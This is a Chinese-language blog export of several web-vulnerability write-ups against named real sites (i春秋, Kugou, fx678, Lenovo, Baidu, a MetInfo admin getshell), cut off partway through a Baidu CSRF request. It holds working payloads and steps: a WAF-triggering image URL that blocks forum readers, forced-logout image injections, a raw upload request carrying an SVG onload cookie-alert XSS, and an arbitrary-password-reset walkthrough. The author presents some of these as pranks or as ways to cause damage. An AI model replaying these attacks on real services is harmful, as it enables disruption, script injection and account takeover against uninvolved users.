<p><img src="http://static.zybuluo.com/1kbfree/6btvax83xx7vsc6lwf4wpbnc/image_1co8pe8r41j8u13va2nqeo4tlsm.png" alt="image_1co8pe8r41j8u13va2nqeo4tlsm.png-80kB"></p>
<h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>我去=v=。这个<code>WAF</code>（加速乐）很强，这都给拦了，但是作为一个捡漏洞的人来讲，要别人交互的漏洞都是低位和不收的，而且这个是要用户打开链接才可以被拦截，但是等下就会正常显示，那用户点击后发现会显示这个页面不可能再次点击把<del>，那么就应该想想如何提升危害，然后我发现了有个好玩的</del></p>
<h3 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h3><p>首先我在本地尝试一下，创建一个<code>HTML</code>文件，代码是</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>拦截吧（你打不开i春秋了）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://bbs.ichunqiu.com/portal.php?a=alert(1)"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<p>然后在浏览器处打开</p>
<p><img src="http://static.zybuluo.com/1kbfree/o1esq9tp010wd1h1lcfg5djd/image_1co8pnjs3hpu61e2qu178avuq13.png" alt="image_1co8pnjs3hpu61e2qu178avuq13.png-13.8kB"></p>
<p>然后再尝试打开<code>I春秋</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/jm5cdg98scgmuh8bruh46a1k/image_1co8ppa5ldmeg3r1b2ria5128h1g.png" alt="image_1co8ppa5ldmeg3r1b2ria5128h1g.png-74.1kB"></p>
<p>我来解释一下为啥子~因为<code>img</code>标签设置的<code>src</code>属性是<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>，所以打开页面会加载<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>这个<code>URL</code>，然后我们访问这个<code>URL</code>的话会被<code>WAF</code>拦截，导致无法访问<code>I春秋</code></p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们可以看到<code>I春秋</code>回复处可以加载图片，如下（随便打开一个文章：<a href="https://bbs.ichunqiu.com/thread-46084-1-1.html）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46084-1-1.html）</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/eje7n4yxnwov6cp5zmiuqoif/image_1co8rbua7oeq4qj6kmte5vvm6r.png" alt="image_1co8rbua7oeq4qj6kmte5vvm6r.png-111.5kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/nk77x8b6bu3olh7vd7o2ecx1/image_1co8rd4ln1s3uj5ubud1st01gij78.png" alt="image_1co8rd4ln1s3uj5ubud1st01gij78.png-149.4kB"></p>
<p>上传的图片是：<a href="https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle" target="_blank" rel="noopener">https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle</a></p>
<p>那么我想让别人访问这个文章就显示<code>WAF</code>拦截页面如何搞？ 嘿嘿，可以在链接后面加个<code>&amp;a=alert(1)</code>，变成<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)</code></p>
<blockquote>
<p>注意：先发一条评论然后点击编辑然后插入这段代码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[img&#x3D;120,120]https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;uc_server&#x2F;avatar.php?uid&#x3D;340720&amp;size&#x3D;middle&amp;a&#x3D;alert(1)[&#x2F;img]</span></pre></td></tr></table></figure>

<p>如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/6sq9x8f4w6ntntvxjxqztqvz/image_1co8rja781h0o9q282f11lva7l82.png" alt="image_1co8rja781h0o9q282f11lva7l82.png-103.1kB"></p>
<p>然后再次访问 <a href="https://bbs.ichunqiu.com/thread-46084-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46084-1-1.html</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/v8ky2tc30m99log7jrih4khx/image_1co8rlknh1bi6i131rafr51nbf8f.png" alt="image_1co8rlknh1bi6i131rafr51nbf8f.png-100.1kB"></p>
<p>可以看到加载了，那么刷新一下~</p>
<p><img src="http://static.zybuluo.com/1kbfree/uz3q9onxmdllqfac4gpwwmam/image_1co8rm7751lfi16hb10e31151rae8s.png" alt="image_1co8rm7751lfi16hb10e31151rae8s.png-81.3kB"></p>
<p>那么，我如果想恶意破坏的话，我可以在每个文章那里加上这个代码（评论），导致每个看文章的人无法正常访问I春秋~~</p>
<h3 id="漏洞案例复现"><a href="#漏洞案例复现" class="headerlink" title="漏洞案例复现"></a>漏洞案例复现</h3><p>利用条件：</p>
<p>1、退出的Url没有Token等验证<br>2、可以有<img>或者其他加载资源的标签</p>
<p>首先，知道某网站的退出链接是<a href="http://www.xxx.com/exit。" target="_blank" rel="noopener">http://www.xxx.com/exit。</a></p>
<p>那么我们可以去找到论坛留言处、头像处、背景图片处将Url设置为<a href="http://www.xxx.com/exit，那么当用户每次访问的时候都会退出。如下是一个漏洞案例" target="_blank" rel="noopener">http://www.xxx.com/exit，那么当用户每次访问的时候都会退出。如下是一个漏洞案例</a></p>
<p>1、打开Url：<a href="http://xxxxxx/forum.php?id=马赛克" target="_blank" rel="noopener">http://xxxxxx/forum.php?id=马赛克</a> （随便找的一个帖子），然后评论一下，并且抓包加入恶意代码，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/mzs2zy1p11g46343mj011xre/image_1cqbpd8e23mnkej99cnep1cro9.png" alt=""></p>
<p>加入的代码是 [img]<a href="http://xxxxxx/logout?client_id=1[/img]" target="_blank" rel="noopener">http://xxxxxx/logout?client_id=1[/img]</a></p>
<p>2、然后打开帖子</p>
<p><img src="http://static.zybuluo.com/1kbfree/ls8y940ot3y8lanz0b9v7u7m/image_1cqbpfvh81qrm1lne1tbo1iou16qm.png" alt=""></p>
<p><img src="http://static.zybuluo.com/1kbfree/vogapad0mu7bdhkmk0zpywab/image_1cqbpif0ptjk1p5d1tqp8slj0j13.png" alt=""></p>
<p>可以看到已经退出了~</p>
<p>利用思路</p>
<p>上面是一个利用思路，但是这个只是评论处的利用，其实还有很多可以，如下几列</p>
<p>1、可以利用Csrf漏洞结合，把头像、个人背景等img的地址修改为退出url<br>2、利用越权改头像把图片地址改成退出地址，然后其他用户一登录就退出，增加危害~<br>3、有些网站聊天处可以发图片，那么可以发送一个退出Url给他，导致退出（单次的，低危害） </p>
<h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>1、有个<code>get</code>请求的<code>csrf</code>，但是严格的验证了<code>referer</code>为<code>www.a.com</code>，那么可以在<code>www.a.com</code>中插入一个外链，然后把外链地址改为<code>get</code>请求的<code>csrf</code>地址，就可以绕过。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计分析之metinfo后台getshell</title>
    <url>/2018/07/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%86%E6%9E%90%E4%B9%8Bmetinfo%E5%90%8E%E5%8F%B0getshell/</url>
    <content><![CDATA[<blockquote>
<p>并非抄袭，而是分析（帮朋友~）。</p>
</blockquote>
<p>原文地址 : <a href="http://www.91ri.org/16663.html" target="_blank" rel="noopener">http://www.91ri.org/16663.html</a></p>
<h3 id="第一处代码分析"><a href="#第一处代码分析" class="headerlink" title="第一处代码分析"></a>第一处代码分析</h3><p><img src="http://static.zybuluo.com/1kbfree/eh6fqqq6g9s1d7yd6cyz9wob/image_1ci1h3ar3oiqnjf26118n91e459.png" alt="image_1ci1h3ar3oiqnjf26118n91e459.png-153.2kB"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$post=<span class="keyword">array</span>(<span class="string">'ver'</span>=&gt;$metcms_v,<span class="string">'app'</span>=&gt;$applist);</span></pre></td></tr><tr><td class="code"><pre><span class="line">$result=curl_post($post,<span class="number">60</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(link_error($result)==<span class="number">1</span>)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	$results=explode(<span class="string">'&lt;Met&gt;'</span>,$result); <span class="comment">//下面会讲解</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    file_put_contents(<span class="string">'dlappfile.php'</span>,$results[<span class="number">1</span>]); <span class="comment">//下面会讲解</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    file_put_contents(<span class="string">'standard.php'</span>,$results[<span class="number">0</span>].$results[<span class="number">1</span>]); <span class="comment">//下面会讲解</span></span></pre></td></tr></table></figure>

<h4 id="第四行："><a href="#第四行：" class="headerlink" title="第四行："></a>第四行：</h4><p><strong>explode函数小案例</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">'iamfree1,iamfree2'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( explode(<span class="string">','</span>, $str) );</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/x4xzr960kautsg6umbsv1a0s/image_1ci1hjfniip7dlpt4o1vmbotr36.png" alt="image_1ci1hjfniip7dlpt4o1vmbotr36.png-21.6kB"></p>
<p>所以<code>explode(&#39;,&#39;, $str)</code>就是将<code>$str</code>中的<code>,</code>的内容分割为出来分别放到数组里。</p>
<h4 id="第5-6行："><a href="#第5-6行：" class="headerlink" title="第5-6行："></a>第5-6行：</h4><p><strong>file_put_contents函数小案例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">'2018-07-10.txt'</span>, <span class="string">'iamfree'</span>); <span class="comment">// 会在当前脚本创建一个2018-07-10.txt文件，内容为iamfree</span></span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/2qzcul3c3hdd61jseuj9sdl0/image_1ci1i1a7v13grtgb1oeh155l18f693.png" alt="image_1ci1i1a7v13grtgb1oeh155l18f693.png-77kB"></p>
<h4 id="第二处代码分析："><a href="#第二处代码分析：" class="headerlink" title="第二处代码分析："></a>第二处代码分析：</h4><p><img src="http://static.zybuluo.com/1kbfree/vo05kq9qdm205fz37bk0qxz8/image_1ci1i505bbuk19eq1r6j1q5n141m9g.png" alt="image_1ci1i505bbuk19eq1r6j1q5n141m9g.png-148kB"></p>
<p>我做了相应的注释，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl_post</span><span class="params">($post,$timeout)</span></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">global</span> $met_weburl,$met_host,$met_file;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    $host=$met_host;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $file=$met_file;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span>(get_extension_funcs(<span class="string">'curl'</span>)&amp;&amp;function_exists(<span class="string">'curl_init'</span>)&amp;&amp;function_exists(<span class="string">'curl_setopt'</span>)&amp;&amp;function_exists(<span class="string">'curl_exec'</span>)&amp;&amp;function_exists(<span class="string">'curl_close'</span>)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	<span class="comment">// 这个if判断是否可以用curl、curl_init、curl_setopt、curl_exec、ecurl_close，如果可用，就执行下面的操作</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$curlHandle=curl_init();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_URL,<span class="string">'http://'</span>.$host.$file); <span class="comment">// CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl); <span class="comment">//CURLOPT_REFERER：在HTTP请求头中"Referer: "的内容。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);<span class="comment">// CURLOPT_RETURNTRANSFER：在启用CURLOPT_RETURNTRANSFER的时候，返回原生的（Raw）输出。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout); <span class="comment">//CURLOPT_CONNECTTIMEOUT：在发起连接前等待的时间，如果设置为0，则无限等待。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout); <span class="comment">//CURLOPT_TIMEOUT：设置cURL允许执行的最长秒数。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_POST, <span class="number">1</span>); <span class="comment">// CURLOPT_POST：启用时会发送一个常规的POST请求，类型为：application/x-www-form-urlencoded，就像表单提交的一样。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post); <span class="comment">// CURLOPT_POSTFIELDS：全部数据使用HTTP协议中的"POST"操作来发送。要发送文件，在文件名前面加上@前缀并使用完整路径。这个参数可以通过urlencoded后的字符串类似'para1=val1&amp;para2=val2&amp;...'或使用一个以字段名为键值，字段数据为值的数组。如果value是一个数组，Content-Type头将会被设置成multipart/form-data</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$result=curl_exec($curlHandle); <span class="comment">// 执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	var_dump($result);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    	curl_close($curlHandle); </span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    	&#125;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/q38bx78ismbvvcg88b66dwa4/image_1ci1ipjoquqvs8o145f92emu0c7.png" alt="image_1ci1ipjoquqvs8o145f92emu0c7.png-356.5kB"></p>
<h3 id="standard-php文件的代码："><a href="#standard-php文件的代码：" class="headerlink" title="standard.php文件的代码："></a>standard.php文件的代码：</h3><p><img src="http://static.zybuluo.com/1kbfree/t4ahag9khsbq1d8o2t6z0l6b/image_1ci1ie3u4i0p3qv1a57r3a1fvibq.png" alt="image_1ci1ie3u4i0p3qv1a57r3a1fvibq.png-81.1kB"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">metinfo</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;Met&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"Joseph"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;Met&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr></table></figure>

<h4 id="疑问："><a href="#疑问：" class="headerlink" title="疑问："></a>疑问：</h4><p>这里为什么要有<code>&lt;Met&gt;</code>呢？  我也不饶圈子了下面是解答</p>
<h4 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h4><p><img src="http://static.zybuluo.com/1kbfree/3vvvwx9n3sycn688cb9un33k/image_1ci1is5nb21ag67ge1660d4mck.png" alt="image_1ci1is5nb21ag67ge1660d4mck.png-145.8kB"></p>
<p>完成，下面的很简单了，不用再讲了(不要问我为什么不自己审计一个，而是去分析别人的，我是不会告诉你我审计不出漏洞的)~</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>联想乐问吧某处设计不当可使用户打开网站慢</title>
    <url>/2018/06/21/%E8%81%94%E6%83%B3%E4%B9%90%E9%97%AE%E5%90%A7%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E4%B8%8D%E5%BD%93%E5%8F%AF%E4%BD%BF%E7%94%A8%E6%88%B7%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99%E6%85%A2/</url>
    <content><![CDATA[<blockquote>
<p>影响用户打开，单单只是用户浏览器加载慢，而不是导致服务器<code>CPU</code>上升等</p>
</blockquote>
<p>1、打开Url：<code>http://ask.lenovomobile.com/?q-628209.html</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/kqp499unolh7kjf6tpen1qx1/image_1ciej1lnd18g14pg19jh1mbp1v1l9.png" alt="image_1ciej1lnd18g14pg19jh1mbp1v1l9.png-340.1kB"></p>
<p>2、选择在线视频，修改视频大小~</p>
<p><img src="http://static.zybuluo.com/1kbfree/xpf83z8l3d3xbglvwqcjvgxr/image_1ciejm71h13mp1eqr12j513qv1en413.png" alt="image_1ciejm71h13mp1eqr12j513qv1en413.png-105kB"></p>
<p>3、查看打开速度</p>
<p><img src="http://static.zybuluo.com/1kbfree/bh64ze48fmb6nc50f9r2qmu2/image_1ciejs6rh18385c4q8i2r1vj72t.png" alt="image_1ciejs6rh18385c4q8i2r1vj72t.png-415.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/u6wbl14ljcp7691f53kejf7o/image_1dtd3e21h1v95j4p1b3tssl7g9.png" alt="image_1dtd3e21h1v95j4p1b3tssl7g9.png-536kB"></p>
<p>总之就是过了很久还没打开好。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>酷狗图片解析漏洞</title>
    <url>/2018/06/21/%E9%85%B7%E7%8B%97%E5%9B%BE%E7%89%87%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>1、打开Url：<a href="http://www.kugou.com/newuc/user/uc/type=avatar" target="_blank" rel="noopener">http://www.kugou.com/newuc/user/uc/type=avatar</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/03fr1fw8xav80y8dy7bjiwcp/image_1clvcbbpa8ljpfmote116gkpq9.png" alt="image_1clvcbbpa8ljpfmote116gkpq9.png-104.2kB"></p>
<p>2、点击浏览然后上传图片，并且抓包，抓取后加入恶意代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;newuc&#x2F;user&#x2F;do&#x2F;type&#x3D;1 HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: www.kugou.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;47.0.2526.73 Safari&#x2F;537.36</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: 这是马赛克;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;www.kugou.com&#x2F;newuc&#x2F;static&#x2F;swf&#x2F;ImagesUpload.swf?img&#x3D;http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180827&#x2F;20180827215721947390.jpg&amp;w&#x3D;165&amp;h&#x3D;165&amp;t&#x3D;201403051544</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-type: application&#x2F;octet-stream</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 44</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;alert(&#39;cookie&#39;+document.cookie)&gt;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/gv0ttlfasswvcqpea7vzfxhw/image_1clvcfukot0gora1krple51smjm.png" alt="image_1clvcfukot0gora1krple51smjm.png-143kB"></p>
<p>然后获取到图片的名字后拼接起来就到了这个Url<code>http://imge.kugou.com/kugouicon/165/20180828/20180828122550814765.jpg</code>，然后在后面加上<code>.html</code>，变成如下Url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180828&#x2F;20180828122550814765.jpg.html</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/kgsb6lcde3uia9yy3g6y5ck1/image_1clvcipmc1jsk1cu8a8b1lhfcva13.png" alt="image_1clvcipmc1jsk1cu8a8b1lhfcva13.png-80.4kB"></p>
<p>成功执行<code>Html</code>代码</p>
<p>然后来搞个恶作剧~，访问Url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;imge.kugou.com&#x2F;kugouicon&#x2F;165&#x2F;20180828&#x2F;20180828122755986316.jpg.txt</span></pre></td></tr></table></figure>

<p>别人还以为我拿<code>shell</code>呢，哈哈哈哈</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汇通网存在cookie混淆导致任意用户密码重置</title>
    <url>/2018/06/17/%E6%B1%87%E9%80%9A%E7%BD%91%E5%AD%98%E5%9C%A8cookie%E6%B7%B7%E6%B7%86%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>1、打开Url：<a href="https://member.fx678.com/ResetPwd_1.html，然后输入正确的手机号码，会来到第二个url" target="_blank" rel="noopener">https://member.fx678.com/ResetPwd_1.html，然后输入正确的手机号码，会来到第二个url</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/27nqadssurzfdokxgmg4ipbb/image_1cpv11mgacpq1ubi1bs11t0d1oib9.png" alt="image_1cpv11mgacpq1ubi1bs11t0d1oib9.png-522.7kB"></p>
<p>2、来到第二步，同样正确的输入验证码来到第三步</p>
<p><img src="http://static.zybuluo.com/1kbfree/sdniciv8xnlpyenqejmk7yfq/image_1cpv14rnvpn312mn1l8t1r8m7gkm.png" alt="image_1cpv14rnvpn312mn1l8t1r8m7gkm.png-495.8kB"></p>
<p>3、然后重新打开Url：<a href="https://member.fx678.com/UserInfo/resetPwd_1，然后输入任意用户手机" target="_blank" rel="noopener">https://member.fx678.com/UserInfo/resetPwd_1，然后输入任意用户手机</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/6lsxxn7hjco4eh9cdma6outl/image_1cpv187kfik31oa714bf5dcvva13.png" alt="image_1cpv187kfik31oa714bf5dcvva13.png-263.8kB"></p>
<p>4、然后会回到 <a href="https://member.fx678.com/UserInfo/resetPwd_2" target="_blank" rel="noopener">https://member.fx678.com/UserInfo/resetPwd_2</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/pr7adqmc9kqjfj9ntd5s2h96/image_1cpv19c9p945b3a6sots715061g.png" alt="image_1cpv19c9p945b3a6sots715061g.png-295.6kB"></p>
<p>5、然后回到第二步的那个链接把密码输入为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123456free</span></pre></td></tr></table></figure>

<p>然后提交</p>
<p><img src="http://static.zybuluo.com/1kbfree/7noc3fbsysy4w80x19txmdoz/image_1cpv1bf7q132218o5145r1hd167v1t.png" alt="image_1cpv1bf7q132218o5145r1hd167v1t.png-410.7kB"></p>
<p>然后用账号<code>18888888888</code>、密码<code>123456free</code>就可以登陆~</p>
<p><img src="http://static.zybuluo.com/1kbfree/ava4qe229ckj98zv5n050y4h/image_1cpv1cl5v4ql1577s811vb417jr2a.png" alt="image_1cpv1cl5v4ql1577s811vb417jr2a.png-219.4kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>百度认证存在逻辑缺陷和csrf漏洞结合导致点击后就能登陆用户账号</title>
    <url>/2018/06/11/%E7%99%BE%E5%BA%A6%E8%AE%A4%E8%AF%81%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E5%92%8Ccsrf%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88%E5%AF%BC%E8%87%B4%E7%82%B9%E5%87%BB%E5%90%8E%E5%B0%B1%E8%83%BD%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7/</url>
    <content><![CDATA[<blockquote>
<p>利用低危漏洞结合成高风险漏洞</p>
</blockquote>
<p>1、打开Url：<a href="http://sem.baidu.com/site/index" target="_blank" rel="noopener">http://sem.baidu.com/site/index</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/qrui9sy0lo93m2a2fa5sr2gv/image_1dtd365o0mq1h3t1d6h1ql48l49.png" alt="image_1dtd365o0mq1h3t1d6h1ql48l49.png-393.9kB"></p>
<p>2、提交后抓包，抓取的数据包如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;site&#x2F;index HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: sem.baidu.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.04</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;sem.baidu.com&#x2F;site&#x2F;index</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: BAIDUID&#x3D;8714ADD7CB5329A63EC76292F17846A6:FG&#x3D;1; BIDUPSID&#x3D;4F674276B62C7A0ED6353C847FA35FA6; PSTM&#x3D;1522409414; 